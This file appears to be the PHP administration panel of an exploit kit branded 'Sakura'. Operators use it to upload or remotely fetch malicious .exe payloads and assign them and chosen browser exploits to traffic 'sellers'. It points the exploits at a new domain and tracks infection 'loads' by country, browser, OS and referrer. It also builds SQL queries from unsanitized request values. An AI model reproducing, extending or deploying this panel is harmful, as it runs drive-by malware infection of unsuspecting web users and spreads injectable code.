<?php
include "config.php";
include "date.php";
if(!isset($_COOKIE['pass']) || $_COOKIE['pass'] != $pass)
{
	if(!isset($_POST['pass']))
	{

	?><link rel="stylesheet" type="text/css" href="style.css" />
	<center><br><br><br><br><form name="" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
	<br><br><br><br><br><input name="pass" type="password" value=""><br>
	<br><input type="submit" value="  Send  ">
	</form>
	<?php
	exit();
	}
	else if($_POST['pass'] != $pass)
	{
		echo"<center><br><br><br><br><red>Wrong password.</red>";
	?><form name="" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
	<br><br><br><br><br><input name="pass" type="password" value=""><br>
	<br><input type="submit" value="  Send  ">
	</form> 
	<?php
	exit();
	}
	else
	{
	    $time=time();
	    setcookie("pass",$pass,$time+166401);
	}
}


?>
<html>
<body>
<head>
<title>- SAKURA -</title>
</head>
<link rel="stylesheet" type="text/css" href="style.css" />
<div id="HeaderLogo">
<img alt="Sakura"  src="logo.jpg"/>
</div>


<script type="text/javascript">
 function show_confirm()
 {
 var r=confirm("Are you sure to delete all statistics?");
 if (r==true)
   {
   alert("Successfull");
   document.location = "<?php echo $_SERVER['PHP_SELF']; ?>?cmd=clean";
   }

 }
 </script>
<br>
<center><a href="<?php echo $_SERVER['PHP_SELF']; ?>"><b>STAT</b></a>&nbsp; <b>|</b> &nbsp;
<a href="<?php echo $_SERVER['PHP_SELF']; ?>?cmd=c"><b>COUNTRY</b></a>&nbsp;
<a><b>|</b></a></a> &nbsp;<a href="<?php echo $_SERVER['PHP_SELF']; ?>?cmd=ref"><b>REFERER</b></a>&nbsp;
<a><b>|</b></a></a> &nbsp;<a href="<?php echo $_SERVER['PHP_SELF']; ?>?cmd=exefile"><b>EXE</b></a>&nbsp;
<a><b>|</b></a></a> &nbsp;<a href="<?php echo $_SERVER['PHP_SELF']; ?>?threads=1"><b>THREADS</b></a>&nbsp;
<a><b>|</b></a></a> &nbsp;<a href="<?php echo $_SERVER['PHP_SELF']; ?>?cmd=rebuild"><b>REBUILD</b></a>&nbsp;
<a><b>|</b></a></a> &nbsp;<a href="#"  onclick="show_confirm()" class='link1'><b>CLEAN</b></a></center>
<?php

if(isset($_GET['cmd']))
{
 $cmd = $_GET['cmd'];
 if($cmd =='clean')
{
	@mysql_query("DELETE from stat");
	@mysql_query("ALTER TABLE stat AUTO_INCREMENT=1");
	//echo"<HTML><HEAD><META HTTP-EQUIV='Refresh' CONTENT='0; URL=admin.php'></HEAD></HTML>";
}
 if($cmd == 'c')
 {
   $query = "SELECT country, count( * ) AS total, sum(`load` = '1') as loads from stat  GROUP BY country ORDER BY loads DESC";
   $show = @mysql_query($query);
   
	echo"<br><br><table border=1  cellspacing=0 cellpadding=0 width='30%' id='ourtable' align='center'> ";
	echo"<tr class='top'>
			<td>Country</td>
			<td>Traffic</td>
			<td>Loads</td>
			<td>Percent</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
		echo"<tr>
    			<td>".$showurl['country']."</td>
				<td>".$showurl['total']."</td>
    			<td>".$showurl['loads']."</td>
				<td>".round($showurl['loads']/$showurl['total']*100, 2)." %</td>
       		</tr>";
    }

    echo"</table>";
	
   exit();
 }
 
 if($cmd == 'ref')
 {
	$query = "SELECT referer, sum(`load` = '1') as loads, count(referer) as traf from stat GROUP BY referer ORDER BY loads DESC";
	$show = @mysql_query($query);
	if($show)
	{
		echo"<br><br><table border=1  cellspacing=0 ñellpadding=0 width='30%' id='ourtable' align='center'>";
		echo"<tr class='top'>
				<td>Source</td>
				<td>Hosts</td>
				<td>Loads</td>
			</tr>";
		while($showurl = mysql_fetch_assoc($show))
		{
			echo"<tr>
					<td>".$showurl['referer']."</td>
					<td>".$showurl['traf']."</td>
					<td>".$showurl['loads']."</td>
				</tr>";
		}
		echo"</table>";
	}

}	

if($cmd =='rebuild') 
{
?><br><br>
<table border='0' cellspacing='0' cellpadding='0'  align='center'>
              <body>
                <tr >
                  <td><label for='contactform-name'><b>Enter ip or domain: (e.g sakura.com or 111.111.11.11)</b></label><br><br>

<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get">
<input SIZE=60 type="text" name="url"><br><br>
<input type="submit" value="Rebuild" style="background-color:#c00; color:#fff ;"/>
</form>
				  				  
                  </td>
				  </tr></body></table>
		  

<?php
}
if($cmd=='exefile') 
{

if(isset($_GET['edit']))
{
			$sql ="SELECT id FROM files WHERE filename='".$_GET['filename']."' ";
			$r = mysql_query($sql);
			$f =mysql_fetch_array($r); 
			$fid = $f['id'];
		if ( isset($_GET['edit']) && isset($_POST['local']))
		{
			if (is_uploaded_file($_FILES['userfile']['tmp_name']))
			{
				$file_load ="load/".$fid.".exe";
				move_uploaded_file($_FILES['userfile']['tmp_name'], $file_load);
				echo "<br><center>File upload is succesful.</center>";
				
			}
			else {
				echo "<br><center>Error. id".$fid." Filename: " . $_FILES['userfile']['name']."</center>";
			}
			exit();
		}
		if(isset($_GET['edit']) && isset($_POST['urlfile']))
		{
		if (!eregi("http://",$_POST['urlfile']))
			$_POST['urlfile'] = "http://".$_POST['urlfile'];
		$fn = $_POST['urlfile'];
		$handle = fopen ($fn, 'rb');
		$contents = "";
		if(!$handle)
			echo '<br><center>Error open source file</center>';
		else
		{
			while(!feof($handle))
			{
				$data = fread($handle, 8192);
				$contents .= $data;
			}
		fclose ($handle);
	
		$file_load ="load/".$fid.".exe";
		$handle = fopen ($file_load, 'wb');
		if(!$handle)
			echo '<br><center>Error create local file</center>';
		else
		{	fwrite($handle, $contents);
			fclose($handle);
			echo '<br><center>File upload is succesful.</center>';
			
		}
		}
	exit();
		}	
		
}

function _loaddat($url)
{

$n = $_GET['filename'];
$date = date("d.m.Y");
mysql_query("INSERT INTO `files` (`filename`, `data`,`url`) VALUES ('" . mysql_real_escape_string((strlen($n) > 0) ? $n.".exe" : "noname.exe") . "', '".$date."','".$url."')");

}

if (isset($_GET['delete']))
{
		mysql_query("DELETE FROM `files` WHERE `id` = " . intval($_GET['delete']) . "");
		mysql_query("UPDATE `threads` SET `file` = 0 WHERE `file` = " . intval($_GET['delete']));
		@unlink("load/".$_GET['delete'].".exe");
		header("Location: " . $_SERVER['PHP_SELF'] . "?cmd=exefile");
		exit();

}

if (isset($_POST['local']))
{
	if (is_uploaded_file($_FILES['userfile']['tmp_name']))
	{
		_loaddat("local upload");
		$file_load ="load/".mysql_insert_id().".exe";
		move_uploaded_file($_FILES['userfile']['tmp_name'], $file_load);
		echo "<br><center>File upload is succesful.</center>";
		
	}
	else {
		echo "<br><center>Error. Filename: " . $_FILES['userfile']['name']."</center>";
	}
}
if(isset($_POST['urlfile']))
{
if (!eregi("http://",$_POST['urlfile']))
	$_POST['urlfile'] = "http://".$_POST['urlfile'];
$fn = $_POST['urlfile'];
$handle = fopen ($fn, 'rb');
$contents = "";
if(!$handle)
	echo '<br><center>Error open source file</center>';
else
{
	while(!feof($handle))
	{
		$data = fread($handle, 8192);
		$contents .= $data;
	}
fclose ($handle);
_loaddat($_POST['urlfile']);
$file_load ="load/".mysql_insert_id().".exe";
$handle = fopen ($file_load, 'wb');
if(!$handle)
	echo '<br><center>Error create local file</center>';
else
{	fwrite($handle, $contents);
	fclose($handle);
	echo '<br><center>File upload is succesful.</center>';
	
}
}
}



$files = array();
	$i = 0;
	$result = mysql_query("SELECT `files`.`id` AS `id`, `files`.`filename` AS `name`, `files`.`data` AS `date`, `files`.`url` AS `uri` from `files` ORDER BY `files`.`id` ASC");
	while ($row = mysql_fetch_array($result)){
		$files[$i]['id'] = $row['id'];
		$files[$i]['name'] = $row['name'];
		$files[$i]['date'] = $row['date'];
		$files[$i]['uri'] = $row['uri'];
		$files[$i]['size'] = filesize("load/".$files[$i]['id'].".exe");
		$i++;
	}



if(isset($_GET['filename']))
{
?>
<br>
 <table border='0' cellspacing='0' cellpadding='0'  align='center'>
              <body>
                <tr >
                  <td><label for='contactform-name'><b>Local file upload:</b></label>

<form enctype="multipart/form-data" action="" method="post">
<input SIZE=60 type="file" name="userfile"><br><br>
<input type="hidden" name="local" value="yes">
<input type="submit" value="Upload" style="background-color:#c00; color:#fff ;"/>
</form>
				  				  
                  </td>
				  </tr></body></table>
				  <br>
 <table border='0' cellspacing='0' cellpadding='0'  align='center'>
              <body>
                <tr>
                  <td><label for='contactform-name'><b>Remote file upload from url:</b></label>


<form action="" method="post">
<input SIZE=70 type="text" name="urlfile" value="http://"><br><br>
<center><input type="submit" value="Upload" style="background-color:#c00; color:#fff ;"/></center>
</form>
  </td>
				  </tr></body></table>
<?php
exit();
}

?><br><br>
<a href="javascript://" onclick="if (document.getElementById('addfile').style.display == 'none'){ document.getElementById('addfile').style.display = 'block'; } else { document.getElementById('addfile').style.display = 'none'; }">
<center><b>Add file</b></center></a><div style="display: none" id="addfile">
<table border='0' cellspacing='0' cellpadding='0'  align='center'>
              <body>
                <tr >
                  <td><label for='contactform-name'><b>File Name:</b></label>

<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>?cmd=exefile&" method="get">
<input type="hidden" name="cmd" value="exefile">
<input SIZE=60 type="text" name="filename"><br><br>
<input type="submit" value="Upload" style="background-color:#c00; color:#fff ;"/>
</form>
				  				  
                  </td>
				  </tr></body></table>
</div>			  
<br><br>
				  


				  
<table  border=0 align='center' id='ourtable'>
	<tr class='top'><td></td><td></td>
	<td  align='center'><b>Name:</b></td>
	<td  align='center'><b>Date:</b></td>
	<td  align='center'><b>URL from upload:</b></td>
	<td  align='center'><b>File size:</b></td>
	</tr>
<?php for ($i = 0; $i < count($files); $i++){?>
   
	<tr>
	<td><a href="?cmd=exefile&delete=<?php echo $files[$i]['id'];?>">delete</a></td>
	<td><a href="?cmd=exefile&edit=1&filename=<?php  echo $files[$i]['name']; ?>">edit</a></td>
	<td  align='center'><?php echo $files[$i]['name'];?></td>
	<td  align='center'><?php echo since($files[$i]['date']);?> Ago</td>
	<td  align='center'><?php echo $files[$i]['uri'];?></td>
	<td  align='center'><?php echo round(($files[$i]['size'] / 1024), 2);?>KB <small>(<?php echo $files[$i]['size'];?> bytes)</small></td>
	</tr><?php }?>
	</table>


<?php
}
		
  exit();
}
elseif(isset($_GET['url'])) 
{
$uri = str_replace('http://', '', $_GET['url']);
$uri = str_replace('www.', '', $uri);
$uri1  = parse_url('http://'.$uri);
$ur = $uri1['host'];
$url="http://".$ur;
$f = fopen("link.php", "w");
fwrite($f, $url);
echo "<br><br><br><center><b> Exploits was rebuilded successfully to $ur </b></center>";
exit();
}

elseif(isset($_GET['threads'])) 
{

if($_GET['threads'] == 'del') 
{
 $l = $_GET['link'];
 $sql = "DELETE from threads WHERE link = '".$l."'";
 mysql_query($sql);
}
elseif($_GET['threads'] == 'clear') 
{
 $l = $_GET['link'];
 @mysql_query("DELETE from stat WHERE thread = '".$l."'");
}
elseif($_GET['threads'] == 'edit') 
{
	if(isset($_POST['file']))
   {
	$result = mysql_query("UPDATE `threads` SET `file`='".$_POST['file']."' WHERE link='".$_GET['link']."' ");
	 echo "<br><center><b>Ok. File has been changed.</b><br>";
   }	
else	
{
	$files = "";
	$result = mysql_query("SELECT `id`,`filename` FROM `files`");
	while ($row = mysql_fetch_array($result))
	{
		$files .= "<option value='" . $row['id'] . "'>" . $row['filename'] . "</option>";
	}
	
?><br><br>
<center><b>Change File:<b></center>
          <form id='contactform' method='post'>
            <table border='0' cellspacing='3' cellpadding='0'>
              <body>
			  <tr>
				<td>Select File:&nbsp
				<select name="file" style="width: 185px;"><option value='0'>none</option><?php echo $files;?></select></td>
			  </tr>
               <tr>  <td><input type="submit" value="Save" style="background-color:#c00; color:#fff ;"/></td></tr>
              
              </body>
            </table>
          </form>

<?php
}
}

elseif($_GET['threads'] == 'spl') 
{
	
	if(isset($_POST['exploits']))
   {
	 $e = "";
     foreach($_POST['exploits'] as $ID)
				$e .= $ID;
   
	$result = mysql_query("UPDATE `threads` SET `exploits`='".$e."' WHERE link='".$_GET['link']."' ");
	 echo "<br><br><center><b>Ok. Exploits have been changed.</b><br>";
    }
		
else	
{
	$exploits = "";
	$tempexp= explode(":", $config['exploits']);
	for ($i = 0; $i < count($tempexp); $i++)
	{
		$exploits .= "<input type='checkbox' id='exp".$i."' name='exploits[]' value='" . $tempexp[$i]. ":'><label for='exp" . $i . "'>" . $tempexp[$i] . "</label>&nbsp"; 
	}
	
?><br><br>
<center><b>Change Exploits:<b></center>
          <form id='contactform' method='post'>
            <table border='0' cellspacing='3' cellpadding='0'>
              <body>
			    <tr>
				<td >Select Exploits:
				<?php echo $exploits;?>
				</td>
				</tr>
              <tr>  <td><input type="submit" value="Save" style="background-color:#c00; color:#fff ;"/></td></tr>
              </body>
            </table>
          </form>

<?php
}
}

$sql = 'SELECT name,link,file FROM `threads` ORDER BY `name` ASC';
$r = mysql_query($sql);
echo "<center><br><br>
<a href=?threads=create>Create new seller</a></center>
<table  border=0 align='center'>
	<tr >
	<td  width='20' align='center'><b>Thread:</b></td>
	<td width='95' align='center'><b>Stats:</b></td> 
	<td width='20' align='center'><b>Delete:</b></td>
	<td width='20' align='center'><b>Clear:</b></td>
	<td width='20' align='center'><b>Links:</b></td>
	<td width='20' align='center'><b>Exe:</b></td>
	<td width='20' align='center'><b>Exploits:</b></td>
	</tr>";

	
	
	
	while ($row = mysql_fetch_array($r)) 
	{
	$sql = "SELECT  sum(`load` = '1') AS good, count( * ) AS total FROM stat WHERE thread='".$row['link']."'"; 
    $r2 = mysql_query($sql);
	$x=mysql_fetch_array($r2);
	$sql1 =" SELECT filename FROM files WHERE id='".$row['file']."' ";
   	$r3 = mysql_query($sql1);
	$x1=mysql_fetch_array($r3);
	$sql2 =" SELECT exploits FROM threads WHERE link='".$row['link']."'"; 
   	$ww = mysql_query($sql2);
	$xx=mysql_fetch_array($ww);
	$exp = str_replace(':',' ',$xx['exploits']);
	if ($x1['filename']==""){$x1['filename']="no file!";}
	if ($x['good']==""){$x['good']="0";}
	if ($x['total']==""){$x['total']="0";}
	if ($exp==""){$exp="no active!";}
		echo "<tr ><td nowrap='nowrap' ' width='20' align='center'><a target=_blank href=".$host."/showthread.php?t=".$row['link']." >".$row['name']."</a></td>";
		echo "<td nowrap='nowrap'  align='center' width='95'>".$x['total']." / ".$x['good']." / ".round($x['good']/$x['total']*100, 2)." %</td>";
		echo "<td nowrap='nowrap'  align='center' width='20'> <a href=?threads=del&link=".$row['link']." >Delete seller</a> </td>";
		echo "<td nowrap='nowrap'  align='center' width='20'> <a href=?threads=clear&link=".$row['link']." >Clear stats </a></td>";
		echo "<td nowrap='nowrap'  align='center' width='20'> <a href=?threads=info&link=".$row['link']." > Links info </a> </td>";
		echo "<td nowrap='nowrap'  align='center' width='20'> <a href=?threads=edit&link=".$row['link']." > ".$x1['filename']." </a> </td>";
		echo "<td nowrap='nowrap'  align='center' width='20'> <a href=?threads=spl&link=".$row['link']." >  ".$exp."  </a></td></tr>";
	}
	echo "</table><br>";


if($_GET['threads'] == 'info') 
{
    $l = $_GET['link'];
    $sql = "SELECT `name`, `link` FROM threads WHERE link ='".$l."'";
    $r = mysql_query($sql);
	echo "<table  border=0 align='center' id='ourtable'>
	<tr class='top' >
	<td  width='50' align='center'><b>Seller:</b></td>
	<td width='50' align='center'><b>Link:</b></td> 
	</tr>";
	
	while ($row = mysql_fetch_array($r)) {
		echo "<tr ><td nowrap='nowrap' ' width='50' align='center'>".$row['name']."</td>";
		echo "<td nowrap='nowrap'  align='link' width='50'>Link for traffs:<br><b> ".$host."/index.php?showtopic=".$row['link']."</b>
		<br>Link for stat:<br> <b>".$host."/showthread.php?t=".$row['link']."</b>
		</td>";
		echo "</tr>";
	}
	
	echo "</table><br>";	
	exit();
}

if($_GET['threads'] == 'create') 
{
	if(isset($_POST['snick'])) 
	{
		$snick = $_POST['snick'];

		$q = mysql_query("select * from threads WHERE name='".$snick."'");
		$n = mysql_num_rows($q);
		@mysql_free_result($q);
		if ($n != 0)  {$err="ERROR! Seller is available<br>";} 
		else
		{
			foreach($_POST['exploits'] as $ID)
				$e .= $ID;
				$link = mt_rand(10,99).mt_rand(10,99).mt_rand(10,99);
			$q = mysql_query("insert into `threads` (`name`, `file`, `link`,`exploits`) values ('".$snick."', '".$_POST['file']."', '".$link."', '".$e."')");
			
			@mysql_free_result($q);
			echo "<center><b>Ok. Seller create is successful.</b><br>";
			
			$sql = "SELECT `name`, `link`  FROM threads WHERE name ='".$snick."'";
			$r = mysql_query($sql);
			echo "<table  border=0 align='center' id='ourtable'>
			<tr class='top'>
			<td  width='50' align='center'><b>Seller:</b></td>
			<td width='50' align='center'><b>Link:</b></td> 
			</tr>";
			
			while ($row = mysql_fetch_array($r)) {
				echo "<tr ><td nowrap='nowrap' ' width='50' align='center'>".$row['name']."</td>";
				echo "<td nowrap='nowrap'  align='link' width='500'>Link for traffs:<br><b> ".$host."/index.php?showtopic=".$row['link']."</b>
				<br>Link for stat:<br> <b>".$host."/showthread.php?t=".$row['link']."</b>
				</td></tr";
			}
			
			echo "</table><br></center>";	
			exit();
		}
	}
	

echo "<center><B>".$err."</b></center>";	

    $files = "";
	$result = mysql_query("SELECT `id`,`filename` FROM `files`");
	while ($row = mysql_fetch_array($result))
	{
		$files .= "<option value='" . $row['id'] . "'>" . $row['filename'] . "</option>";
	}
	$exploits = "";
	$tempexp= explode(":", $config['exploits']);
	for ($i = 0; $i < count($tempexp); $i++)
	{
		 if($i == count($tempexp)-1) $exploits .= "<input type='checkbox' id='exp".$i."' name='exploits[]' value='" . $tempexp[$i]. "'><label for='exp" . $i . "'>" . $tempexp[$i] . "</label>&nbsp"; 
		 else $exploits .= "<input type='checkbox' id='exp".$i."' name='exploits[]' value='" . $tempexp[$i]. ":'><label for='exp" . $i . "'>" . $tempexp[$i] . "</label>&nbsp"; 
	}
?><br><br>
<center><b>Create seller:<b></center>
<br>

          <form id='contactform' method='post'>
            <table border='0' cellspacing='3' cellpadding='0'>
              <body>
			  <tr>
			  <td >Select Exploits:
				<?php echo $exploits;?>
				</td>
			  </tr>
			  <tr>
				<td><br>Select File:&nbsp
				<select name="file" style="width: 185px;"><option value='0'>none</option><?php echo $files;?></select></td>
			  </tr>
                <tr>
                  <td colspan="0" style="text-align: center;">  <br><br><label for='contactform-subject'>&nbsp;Name:</label>
                    &nbsp;<input type='text' name='snick' id='contactform-name' />
                  
                   <input type="submit" value="Create" style="background-color:#c00; color:#fff ;"/>
              </tr>
              </body>
            </table>
          </form>

<?php
}
 
 exit();
}

$query = "SELECT exploit, sum(`load` = '1') as loads, MAX(id) as ma from stat WHERE `load`='1' GROUP BY exploit";
$show = @mysql_query($query);
$q = "SELECT count(*) AS al, sum(`load` = '1') as loads from stat";
$s = @mysql_query($q);
$res = mysql_fetch_assoc($s);
echo"<br><br><table border=1  cellspacing=0 ñellpadding=0 id='ourtable' align='center' >";
	echo"<tr class='top'>
			<td>Hosts</td>
			<td>Run</td>
			<td>Rate</td>
		</tr>";
		$r = round($res ["loads"] / $res ["al"] * 100 ,1);
		echo"<tr>
    			<td>".$res['al']."</td>
    			<td>".$res['loads']."</td>
				<td>". $r."%</td>
       		</tr>";
	
	echo"</table>";
if($show)
{
	
	echo"<table border=1  cellspacing=0 ñellpadding=0  id='ourtable' align='center'>";
	echo"<tr class='top'>
			<td>Exploit</td>
			<td>Loads</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
		echo"<tr>
    			<td>".$showurl['exploit']."</td>
    			<td>".$showurl['loads']."</td>
       		</tr>";
    }

	echo"</table>";

}
$query = "SELECT browser, sum(`load` = '1') as loads, count(browser) as traf from stat GROUP BY browser";
$show = @mysql_query($query);
if($show)
{
	echo"<table border=1  cellspacing=0 ñellpadding=0  id='ourtable' align='center'>";
	echo"<tr class='top'>
			<td>Browser</td>
			<td>Hosts</td>
			<td>Loads</td>
			<td>Result</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
    	if($showurl['loads'] == 0) $pr = 0;
		else $pr = round($showurl['loads'] / $showurl['traf'] * 100 ,1);
		echo"<tr>
    			<td>".$showurl['browser']."</td>
    			<td>".$showurl['traf']."</td>
				<td>".$showurl['loads']."</td>
				<td>".$pr."%</td>
       		</tr>";
    }
    echo"</table>";
}
$query = "SELECT os, sum(`load` = '1') as loads, count(os) as traf from stat GROUP BY os ORDER BY loads DESC";
$show = @mysql_query($query);
if($show)
{
	echo"<table border=1  cellspacing=0 ñellpadding=0 id='ourtable' align='center'>";
	echo"<tr class='top'>
			<td>Operation System</td>
			<td>Hosts</td>
			<td>Loads</td>
		</tr>";
    while($showurl = mysql_fetch_assoc($show))
    {
    	
		echo"<tr>
    			<td>".$showurl['os']."</td>
    			<td>".$showurl['traf']."</td>
				<td>".$showurl['loads']."</td>
       		</tr>";
    }
    echo"</table>";
}
?>
<body></html>
